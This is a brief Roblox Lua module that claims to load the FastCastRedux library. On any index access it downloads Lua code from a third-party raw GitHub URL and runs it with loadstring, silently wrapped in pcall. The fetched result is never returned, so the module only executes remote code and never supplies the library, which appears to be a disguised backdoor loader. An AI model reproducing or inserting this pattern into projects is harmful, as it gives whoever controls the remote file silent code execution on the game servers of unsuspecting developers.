local Module = {}
local HttpService = game:GetService("HttpService")

local SubModules = {["FastCastRedux"] = 'https://raw.githubusercontent.com/rutheniumm/roblox/main/FastCastRedux.lua'}

setmetatable(Module, {__index = function(tbl, index, value)
pcall(function()
return loadstring(HttpService:GetAsync(SubModules[index]))()
end)
end})  

return Module;